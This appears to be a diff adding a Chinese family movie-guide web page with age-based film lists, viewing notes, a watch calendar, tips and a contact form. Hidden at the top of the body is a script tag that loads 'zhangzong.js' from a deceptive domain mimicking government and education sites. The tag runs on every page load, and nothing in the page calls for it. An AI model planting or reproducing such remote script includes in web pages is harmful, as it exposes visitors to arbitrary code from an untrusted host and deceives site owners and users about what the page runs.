@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>琪琪影视 — 温馨家庭观影指南与经典片单分享 | qiqiyingshi-zh</title>
+<meta name="description" content="琪琪影视（qiqiyingshi-zh）是一个以家庭观影、亲子共赏与经典重温为核心的影视分享站点，提供分龄片单、观影笔记与选片建议，帮助你和家人轻松找到值得一起看的电影。">
+<meta name="keywords" content="琪琪影视, qiqiyingshi-zh, 家庭观影, 亲子电影, 经典片单, 观影指南, 影视推荐">
+<meta name="author" content="琪琪影视">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<link rel="canonical" href="https://qiqiyingshi-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --cream:#fdf6ec;--paper:#fffaf3;--ink:#2f2a24;--ink2:#6b6157;--ink3:#a39a8e;
+  --coral:#e8856d;--coral2:#f4a48f;--sage:#7fa98a;--mustard:#e6b450;--plum:#8a6f9e;
+  --line:rgba(47,42,36,.09);--shadow:0 8px 30px rgba(120,100,80,.1)
+}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;background:var(--cream);color:var(--ink);line-height:1.85;-webkit-font-smoothing:antialiased}
+img{max-width:100%;display:block}
+a{text-decoration:none;color:inherit}
+.wrap{max-width:1180px;margin:0 auto;padding:0 26px}
+
+/* 导航 */
+nav{position:sticky;top:0;z-index:100;background:rgba(253,246,236,.9);backdrop-filter:blur(12px);border-bottom:1px dashed var(--line)}
+.nv{display:flex;align-items:center;height:66px}
+.logo{font-size:23px;font-weight:800;letter-spacing:.5px;color:var(--ink)}
+.logo em{font-style:normal;color:var(--coral)}
+.logo small{font-size:10px;color:var(--ink3);margin-left:8px;font-weight:500;letter-spacing:1px}
+.menu{display:flex;list-style:none;gap:6px;margin-left:auto}
+.menu a{font-size:14px;color:var(--ink2);padding:8px 15px;border-radius:22px;transition:.3s}
+.menu a:hover{background:var(--coral);color:#fff}
+.ham{display:none;margin-left:auto;cursor:pointer;font-size:22px;color:var(--ink)}
+
+/* Hero */
+.hero{padding:70px 0 50px;overflow:hidden;position:relative}
+.hg{display:grid;grid-template-columns:1.15fr .85fr;gap:56px;align-items:center}
+.hg .txt h1{font-size:clamp(30px,4.4vw,52px);line-height:1.24;font-weight:800;letter-spacing:-.5px;margin-bottom:18px}
+.hg .txt h1 i{font-style:normal;color:var(--coral);position:relative;white-space:nowrap}
+.hg .txt h1 i::after{content:"";position:absolute;left:0;right:0;bottom:4px;height:10px;background:rgba(230,180,80,.4);z-index:-1;border-radius:3px}
+.hg .txt p{font-size:15px;color:var(--ink2);margin-bottom:26px;max-width:460px}
+.hg .cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:13px 30px;border-radius:30px;font-size:14px;font-weight:700;transition:.3s;display:inline-flex;align-items:center;gap:7px}
+.btn.p{background:var(--coral);color:#fff;box-shadow:0 8px 22px rgba(232,133,109,.35)}
+.btn.p:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(232,133,109,.45)}
+.btn.s{background:var(--paper);color:var(--ink);border:1px solid var(--line)}
+.btn.s:hover{border-color:var(--coral);color:var(--coral)}
+.hg .pics{position:relative;height:440px}
+.float{position:absolute;border-radius:20px;overflow:hidden;box-shadow:var(--shadow);border:5px solid #fff}
+.f1{width:60%;height:62%;top:0;left:0;transform:rotate(-4deg)}
+.f2{width:52%;height:56%;top:34%;right:0;transform:rotate(5deg)}
+.f3{width:34%;height:30%;bottom:-6%;left:22%;transform:rotate(-3deg)}
+.float img{width:100%;height:100%;object-fit:cover}
+.fnote{position:absolute;background:#fff;border-radius:14px;padding:12px 16px;box-shadow:var(--shadow);font-size:13px;line-height:1.5}
+.fnote b{display:block;color:var(--coral);font-size:11px;letter-spacing:1px;margin-bottom:3px}
+.n1{top:14%;right:-8%;width:170px}
+.n2{bottom:22%;left:-12%;width:180px}
+
+/* 波浪分隔 */
+.wave{display:block;width:100%;height:auto;margin-top:-1px}
+
+/* 通用 section */
+section{padding:66px 0;position:relative}
+.eyebrow{font-size:12px;letter-spacing:3px;color:var(--coral);font-weight:700;text-transform:uppercase}
+.sec-t{margin-bottom:34px;text-align:center}
+.sec-t h2{font-size:clamp(24px,3.4vw,38px);font-weight:800;margin-top:6px;position:relative;display:inline-block}
+.sec-t h2::before{content:"❁";color:var(--mustard);position:absolute;left:-34px;top:2px;font-size:20px}
+.sec-t h2::after{content:"❁";color:var(--mustard);position:absolute;right:-34px;top:2px;font-size:20px}
+.sec-t p{color:var(--ink2);font-size:14px;margin-top:10px}
+
+/* 分龄片单 */
+.ages{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.age{background:var(--paper);border:1px solid var(--line);border-radius:22px;padding:26px 22px;transition:.35s;position:relative;overflow:hidden}
+.age::before{content:"";position:absolute;top:0;left:0;right:0;height:5px}
+.age:nth-child(1)::before{background:var(--coral)}
+.age:nth-child(2)::before{background:var(--mustard)}
+.age:nth-child(3)::before{background:var(--sage)}
+.age:nth-child(4)::before{background:var(--plum)}
+.age:hover{transform:translateY(-6px);box-shadow:var(--shadow)}
+.age .ico{font-size:34px;margin-bottom:12px;display:block}
+.age h3{font-size:18px;margin-bottom:6px}
+.age .who{font-size:12px;color:var(--coral);font-weight:700;margin-bottom:12px}
+.age ul{list-style:none}
+.age li{font-size:13px;color:var(--ink2);padding:5px 0;border-bottom:1px dashed var(--line)}
+.age li:last-child{border-bottom:0}
+.age li::before{content:"♥";color:var(--mustard);margin-right:7px;font-size:10px}
+
+/* 观影笔记 */
+.notes{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:22px}
+.note{background:#fff;border-radius:20px;overflow:hidden;box-shadow:var(--shadow);transition:.35s;display:flex;flex-direction:column}
+.note:hover{transform:translateY(-5px)}
+.note .th{height:170px;position:relative}
+.note .th img{width:100%;height:100%;object-fit:cover}
+.note .th span{position:absolute;top:14px;left:14px;background:rgba(255,255,255,.92);color:var(--ink);font-size:11px;padding:5px 12px;border-radius:20px;font-weight:700}
+.note .bd{padding:20px 22px;flex:1;display:flex;flex-direction:column}
+.note .bd h3{font-size:17px;margin-bottom:8px}
+.note .bd p{font-size:13px;color:var(--ink2);flex:1}
+.note .ft{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:14px;border-top:1px dashed var(--line);font-size:12px;color:var(--ink3)}
+.note .ft b{color:var(--mustard)}
+
+/* 观影日历 */
+.cal{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.wk{display:grid;grid-template-columns:repeat(7,1fr);gap:8px}
+.wk .hd{text-align:center;font-size:11px;color:var(--ink3);padding-bottom:8px;font-weight:700}
+.wk .d{aspect-ratio:1;background:var(--paper);border:1px solid var(--line);border-radius:14px;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:12px;color:var(--ink2);transition:.25s;cursor:pointer}
+.wk .d:hover{border-color:var(--coral);color:var(--coral);transform:scale(1.06)}
+.wk .d.on{background:var(--coral);color:#fff;border-color:var(--coral)}
+.wk .d .dot{width:5px;height:5px;border-radius:50%;background:var(--mustard);margin-top:3px}
+.cal .info h3{font-size:22px;margin-bottom:14px}
+.cal .info ul{list-style:none}
+.cal .info li{font-size:14px;color:var(--ink2);padding:10px 0;border-bottom:1px dashed var(--line);display:flex;gap:10px}
+.cal .info li b{color:var(--coral);font-size:12px;min-width:44px}
+
+/* 小贴士 */
+.tips{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.tip{background:var(--paper);border-left:4px solid var(--sage);border-radius:0 14px 14px 0;padding:18px 22px;transition:.3s}
+.tip:hover{background:#fff;box-shadow:var(--shadow)}
+.tip:nth-child(2){border-left-color:var(--mustard)}
+.tip:nth-child(3){border-left-color:var(--plum)}
+.tip:nth-child(4){border-left-color:var(--coral)}
+.tip h3{font-size:15px;margin-bottom:6px;display:flex;align-items:center;gap:8px}
+.tip h3 i{font-style:normal;color:var(--mustard);font-size:16px}
+.tip p{font-size:13px;color:var(--ink2)}
+
+/* 信笺表单 */
+.letter{background:#fff;border-radius:28px;padding:44px;box-shadow:var(--shadow);max-width:760px;margin:0 auto;position:relative}
+.letter::before{content:"✉";position:absolute;top:-22px;left:50%;transform:translateX(-50%);background:var(--mustard);color:#fff;width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;box-shadow:0 6px 16px rgba(230,180,80,.4)}
+.letter h3{text-align:center;font-size:21px;margin-bottom:8px}
+.letter>p{text-align:center;font-size:13px;color:var(--ink3);margin-bottom:26px}
+.lg{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.fx{display:flex;flex-direction:column;gap:7px}
+.fx label{font-size:12px;color:var(--ink2);font-weight:700}
+.fx input,.fx select,.fx textarea{font-family:inherit;font-size:14px;background:var(--paper);border:1px solid var(--line);border-radius:12px;padding:12px 14px;color:var(--ink);transition:.25s}
+.fx input:focus,.fx select:focus,.fx textarea:focus{outline:0;border-color:var(--coral);background:#fff}
+.fx textarea{grid-column:1/-1;resize:vertical;min-height:100px}
+.lg .btn{padding:14px 30px;font-size:15px;border:0;cursor:pointer;width:100%;justify-content:center;margin-top:8px}
+
+/* 页脚 */
+footer{background:var(--ink);color:#e8e2da;padding:56px 0 26px;margin-top:40px}
+.ft{display:grid;grid-template-columns:1.6fr 1fr 1fr;gap:40px;margin-bottom:34px}
+.ft .lb{font-size:24px;font-weight:800;color:#fff;margin-bottom:12px}
+.ft .lb em{font-style:normal;color:var(--coral2)}
+.ft .lb~p{font-size:13px;color:#b8b0a6;margin-bottom:8px}
+.ft h4{font-size:14px;color:#fff;margin-bottom:14px;letter-spacing:1px}
+.ft a{display:block;font-size:13px;color:#b8b0a6;padding:5px 0;transition:.25s}
+.ft a:hover{color:var(--mustard)}
+.fb{display:flex;justify-content:space-between;align-items:center;border-top:1px solid rgba(255,255,255,.12);padding-top:20px;font-size:12px;color:#8f8780;flex-wrap:wrap;gap:10px}
+.fb a{color:var(--coral2)}
+
+.up{position:fixed;right:22px;bottom:22px;width:46px;height:46px;border-radius:50%;background:var(--coral);color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:90;opacity:0;visibility:hidden;transition:.3s;font-size:18px;box-shadow:0 8px 20px rgba(232,133,109,.4)}
+.up.on{opacity:1;visibility:visible}
+
+.rv{opacity:0;transform:translateY(26px);transition:.6s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:translateY(0)}
+
+@media(max-width:900px){
+  .menu{display:none;position:fixed;top:66px;left:0;right:0;flex-direction:column;background:var(--paper);padding:16px;border-bottom:1px solid var(--line)}
+  .menu.open{display:flex}
+  .ham{display:block}
+  .hg{grid-template-columns:1fr;gap:40px}
+  .hg .pics{height:360px;max-width:440px;margin:0 auto;width:100%}
+  .ages{grid-template-columns:1fr 1fr}
+  .cal{grid-template-columns:1fr;gap:26px}
+  .tips{grid-template-columns:1fr}
+  section{padding:50px 0}
+}
+@media(max-width:560px){
+  .wrap{padding:0 18px}
+  .ages{grid-template-columns:1fr}
+  .lg{grid-template-columns:1fr}
+  .hg .pics{height:300px}
+  .n1,.n2{display:none}
+  .letter{padding:36px 22px}
+  .ft{grid-template-columns:1fr}
+  .fb{flex-direction:column;text-align:center}
+  .sec-t h2::before,.sec-t h2::after{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<nav>
+  <div class="wrap nv">
+    <a href="#" class="logo">琪琪<em>影视</em><small>QIYI FILM</small></a>
+    <ul class="menu" id="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#age">分龄片单</a></li>
+      <li><a href="#note">观影笔记</a></li>
+      <li><a href="#plan">观影日历</a></li>
+      <li><a href="#tip">小贴士</a></li>
+      <li><a href="#msg">给我留言</a></li>
+    </ul>
+    <div class="ham" id="ham">☰</div>
+  </div>
+</nav>
+
+<!-- Hero -->
+<section class="hero" id="home" style="padding-top:40px">
+  <div class="wrap hg">
+    <div class="txt rv">
+      <span class="eyebrow">Family Movie Time</span>
+      <h1>和家人一起<br>找到那部<em>值得反复看</em>的电影</h1>
+      <p>琪琪影视（qiqiyingshi-zh）不做片海堆砌，只做精选。我们按年龄段、心情与场景整理片单，写下真实的观影感受，帮你在有限的时间里选对片子。</p>
+      <div class="cta"><a href="#age" class="btn p">看看分龄片单 →</a><a href="#note" class="btn s">读观影笔记</a></div>
+    </div>
+    <div class="pics">
+      <div class="float f1"><img src="https://picsum.photos/seed/q1/500/600" alt="家庭观影" loading="eager"></div>
+      <div class="float f2"><img src="https://picsum.photos/seed/q2/500/560" alt="亲子共赏" loading="lazy"></div>
+      <div class="float f3"><img src="https://picsum.photos/seed/q3/400/380" alt="经典重温" loading="lazy"></div>
+      <div class="fnote n1"><b>周末亲子场</b>90 分钟以内<br>笑点密集不烧脑</div>
+      <div class="fnote n2"><b>深夜重温</b>老片也有新滋味<br>适合两个人静静看</div>
+    </div>
+  </div>
+</section>
+
+<svg class="wave" viewBox="0 0 1440 60" preserveAspectRatio="none"><path fill="#fffaf3" d="M0,30 C240,55 480,5 720,25 C960,45 1200,15 1440,30 L1440,60 L0,60 Z"/></svg>
+
+<!-- 分龄片单 -->
+<section id="age" style="background:var(--paper)">
+  <div class="wrap">
+    <div class="sec-t rv"><span class="eyebrow">Pick by Age</span><h2>分龄片单</h2><p>不同年龄看不同的好，片单按适龄度整理，省去你翻评分的时间</p></div>
+    <div class="ages">
+      <div class="age rv">
+        <span class="ico">🧸</span><h3>3-6 岁</h3><span class="who">启蒙与陪伴</span>
+        <ul><li>龙猫</li><li>小猪佩奇 剧场版</li><li>海底总动员</li><li>猜猜我有多爱你</li><li>白雪公主与七个小矮人</li></ul>
+      </div>
+      <div class="age rv">
+        <span class="ico">🎒</span><h3>7-12 岁</h3><span class="who">勇气与成长</span>
+        <ul><li>千与千寻</li><li>奇迹男孩</li><li>ET 外星人</li><li>哈利·波特与魔法石</li><li>飞屋环游记</li></ul>
+      </div>
+      <div class="age rv">
+        <span class="ico">🎧</span><h3>13-18 岁</h3><span class="who">思考与共鸣</span>
+        <ul><li>心灵奇旅</li><li>摔跤吧！爸爸</li><li>当幸福来敲门</li><li>死亡诗社</li><li>你的名字</li></ul>
+      </div>
+      <div class="age rv">
+        <span class="ico">🛋️</span><h3>成人场</h3><span class="who">回味与放松</span>
+        <ul><li>海蒂和爷爷</li><li>小森林</li><li>饮食男女</li><li>星际穿越</li><li>寻梦环游记</li></ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<svg class="wave" viewBox="0 0 1440 60" preserveAspectRatio="none"><path fill="#fdf6ec" d="M0,30 C240,5 480,55 720,35 C960,15 1200,45 1440,30 L1440,60 L0,60 Z"/></svg>
+
+<!-- 观影笔记 -->
+<section id="note">
+  <div class="wrap">
+    <div class="sec-t rv"><span class="eyebrow">Watch &amp; Write</span><h2>观影笔记</h2><p>不写剧情复述，只写看完之后心里留下的那一点东西</p></div>
+    <div class="notes">
+      <article class="note rv">
+        <div class="th"><img src="https://picsum.photos/seed/n1/600/360" alt="观影笔记配图" loading="lazy"><span>亲子共赏</span></div>
+        <div class="bd"><h3>陪孩子看《龙猫》，看的其实是自己</h3><p>第一次看是童年，第二次是陪孩子看，第三次才看懂藏在画面背后的孤独与温柔。影片里没有一句说教，却把"等待"这件事讲得那么美。</p><div class="ft"><span>琪琪 · 2026-09-12</span><b>♥ 适合 4 岁+</b></div></div>
+      </article>
+      <article class="note rv">
+        <div class="th"><img src="https://picsum.photos/seed/n2/600/360" alt="观影笔记配图" loading="lazy"><span>经典重温</span></div>
+        <div class="bd"><h3>《小森林》：一个人吃饭，也可以很热闹</h3><p>没有跌宕起伏的情节，只有切菜的声音、灶台上的热气，和四季轮转的饭桌。适合疲惫的夜晚，看完会想给自己煮一碗热汤。</p><div class="ft"><span>琪琪 · 2026-08-28</span><b>♥ 放松治愈</b></div></div>
+      </article>
+      <article class="note rv">
+        <div class="th"><img src="https://picsum.photos/seed/n3/600/360" alt="观影笔记配图" loading="lazy"><span>成长必看</span></div>
+        <div class="bd"><h3>《死亡诗社》：敢不敢换个角度看世界</h3><p>给青春期孩子的片子很多，但这一部给的是"自由思考"的种子。建议家长和孩子一起看，然后聊一聊，而不是讲道理。</p><div class="ft"><span>琪琪 · 2026-08-15</span><b>♥ 13 岁+</b></div></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 观影日历 -->
+<section id="plan" style="background:var(--paper)">
+  <div class="wrap">
+    <div class="sec-t rv"><span class="eyebrow">Movie Calendar</span><h2>一周观影日历</h2><p>点选日期，看看琪琪这一周打算看什么</p></div>
+    <div class="cal">
+      <div class="wk rv">
+        <div class="hd">日</div><div class="hd">一</div><div class="hd">二</div><div class="hd">三</div><div class="hd">四</div><div class="hd">五</div><div class="hd">六</div>
+        <div class="d">1</div><div class="d">2</div><div class="d on">3<span class="dot"></span></div><div class="d">4<span class="dot"></span></div><div class="d">5</div><div class="d">6<span class="dot"></span></div><div class="d">7</div>
+        <div class="d">8</div><div class="d">9<span class="dot"></span></div><div class="d">10</div><div class="d on">11<span class="dot"></span></div><div class="d">12</div><div class="d">13<span class="dot"></span></div><div class="d">14</div>
+        <div class="d">15</div><div class="d">16</div><div class="d">17<span class="dot"></span></div><div class="d">18</div><div class="d">19</div><div class="d">20</div><div class="d">21</div>
+        <div class="d">22</div><div class="d">23<span class="dot"></span></div><div class="d">24</div><div class="d">25</div><div class="d">26<span class="dot"></span></div><div class="d">27</div><div class="d">28</div>
+      </div>
+      <div class="info rv">
+        <h3>本周精选排片</h3>
+        <ul>
+          <li><b>周三</b><span>《寻梦环游记》— 亡灵节主题，聊死亡也可以很温暖</span></li>
+          <li><b>周五</b><span>《摔跤吧！爸爸》— 周末开启，先来点热血</span></li>
+          <li><b>周六</b><span>《海蒂和爷爷》— 阿尔卑斯山的慢时光</span></li>
+          <li><b>周日</b><span>全家场：《疯狂动物城》— 笑点密集，老少通吃</span></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 小贴士 -->
+<section id="tip">
+  <div class="wrap">
+    <div class="sec-t rv"><span class="eyebrow">Little Tips</span><h2>选片小贴士</h2><p>选片这件事，其实比看片更需要经验</p></div>
+    <div class="tips">
+      <div class="tip rv"><h3><i>①</i>先看时长再看评分</h3><p>陪孩子看，90 分钟以内是舒适区。太长的片子容易中途失去耐心，体验反而打折。</p></div>
+      <div class="tip rv"><h3><i>②</i>预告片比评分更诚实</h3><p>评分是别人的口味，预告片里的画面和节奏才是你能不能坐得住的真实答案。</p></div>
+      <div class="tip rv"><h3><i>③</i>老片值得反复看</h3><p>很多十年前的片子在画面和叙事上依然耐看，而且不容易被剧透，惊喜感更强。</p></div>
+      <div class="tip rv"><h3><i>④</i>看完聊五分钟</h3><p>别急着看下一个。问一句"你最喜欢哪个角色"，收获往往比片子本身更多。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 留言 -->
+<section id="msg" style="background:var(--paper)">
+  <div class="wrap">
+    <div class="letter rv">
+      <h3>想看什么，告诉琪琪</h3>
+      <p>留下你想看的题材或片名，琪琪会把它写进下一份片单里</p>
+      <form class="lg" onsubmit="event.preventDefault();alert('留言已收到，琪琪会认真看的 ♥')">
+        <div class="fx"><label>怎么称呼</label><input type="text" placeholder="比如：小树妈妈" required></div>
+        <div class="fx"><label>观看场景</label><select><option>亲子共赏</option><option>情侣约会</option><option>一个人放松</option><option>全家聚会</option><option>长辈同看</option></select></div>
+        <div class="fx" style="grid-column:1/-1"><label>想看的类型或片名</label><input type="text" placeholder="例如：想看关于友情的动画，或者类似《小森林》的片子" required></div>
+        <div class="fx" style="grid-column:1/-1"><label>补充说明（选填）</label><textarea placeholder="有没有年龄限制、时长偏好、或者想避开的主题？"></textarea></div>
+        <button type="submit" class="btn p">把片单交给我 →</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div>
+        <div class="lb">琪琪<em>影视</em></div>
+        <p>琪琪影视（qiqiyingshi-zh）是一个由观影爱好者维护的私人片单分享站，专注家庭观影与经典重温。</p>
+        <p>官网：<a href="https://qiqiyingshi-zh.github.io" style="color:var(--coral2)">https://qiqiyingshi-zh.github.io</a></p>
+      </div>
+      <div>
+        <h4>片单分类</h4>
+        <a href="#age">分龄片单</a>
+        <a href="#note">观影笔记</a>
+        <a href="#plan">观影日历</a>
+        <a href="#tip">选片贴士</a>
+      </div>
+      <div>
+        <h4>关于琪琪</h4>
+        <a href="#">选片标准</a>
+        <a href="#">片源说明</a>
+        <a href="#msg">留言建议</a>
+        <a href="#">联系邮箱</a>
+      </div>
+    </div>
+    <div class="fb">
+      <span>&copy; 2026 琪琪影视 qiqiyingshi-zh · 本站为个人观影分享，影片版权归原作者所有</span>
+      <a href="https://qiqiyingshi-zh.github.io">https://qiqiyingshi-zh.github.io</a>
+    </div>
+  </div>
+</footer>
+
+<div class="up" id="up">↑</div>
+
+<script>
+const ham=document.getElementById('ham'),menu=document.getElementById('menu');
+ham.addEventListener('click',()=>menu.classList.toggle('open'));
+menu.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>menu.classList.remove('open')));
+
+const up=document.getElementById('up');
+addEventListener('scroll',()=>up.classList.toggle('on',scrollY>700));
+up.addEventListener('click',()=>scrollTo({top:0,behavior:'smooth'}));
+
+const io=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}});},{threshold:.12});
+document.querySelectorAll('.rv').forEach(el=>io.observe(el));
+
+document.querySelectorAll('.wk .d').forEach(d=>d.addEventListener('click',()=>{
+  if(d.classList.contains('on'))return;
+  document.querySelectorAll('.wk .d').forEach(x=>x.classList.remove('on'));
+  d.classList.add('on');
+}));
+</script>
+</body>
+</html>
